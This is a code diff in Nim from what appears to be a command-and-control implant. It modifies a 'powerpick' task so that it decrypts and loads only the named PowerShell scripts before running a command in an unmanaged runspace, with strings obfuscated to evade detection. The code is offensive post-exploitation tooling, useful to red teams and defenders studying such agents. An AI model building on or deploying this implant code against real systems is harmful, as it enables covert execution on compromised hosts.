@@ -62,14 +62,24 @@ proc powerpick*(taskId: string, params: JsonNode): JsonNode =
         else:
           discard
       
-      # Build the full script: prepend all imported scripts, then the command
+      # Build the full script: selectively prepend imported scripts, then the command
       var fullScript = ""
-      let importedScripts = getImportedPsScripts()
-      if importedScripts.len > 0:
-        output.add(obf("[*] Loading ") & $importedScripts.len & obf(" imported script(s)...\n"))
-        for script in importedScripts:
-          fullScript.add(script.content)
-          fullScript.add("\n")
+
+      # Parse optional scripts parameter
+      var scripts: seq[string] = @[]
+      if params.hasKey(obf("scripts")):
+        for item in params[obf("scripts")]:
+          scripts.add(item.getStr())
+
+      if scripts.len > 0:
+        # Selective loading: only decrypt and load specified scripts
+        let selectedScripts = getImportedPsScriptsByNames(scripts)
+        if selectedScripts.len > 0:
+          output.add(obf("[*] Loading ") & $selectedScripts.len & obf(" selected script(s)...\n"))
+          for script in selectedScripts:
+            fullScript.add(script.content)
+            fullScript.add("\n")
+      
       fullScript.add(args.command)
       
       # Load System.Management.Automation and create runspace
